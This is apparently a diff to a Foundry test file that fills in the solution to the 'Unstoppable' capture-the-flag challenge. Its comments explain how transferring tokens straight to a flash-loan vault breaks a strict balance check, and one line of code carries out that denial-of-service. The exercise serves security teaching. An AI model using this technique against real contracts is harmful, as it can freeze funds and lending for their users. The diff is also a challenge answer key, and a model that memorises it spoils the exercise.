@@ -91,7 +91,15 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // The vulnerability: flashLoan checks if convertToShares(totalSupply) == balanceBefore
+        // balanceBefore = totalAssets() = actual token balance in vault
+        //
+        // By directly transferring tokens (not depositing), we:
+        // 1. Increase totalAssets() (balance goes up)
+        // 2. Keep totalSupply the same (no shares minted)
+        // 3. Break the invariant, causing flashLoan to revert with InvalidBalance()
+
+        token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE);
     }
 
     /**
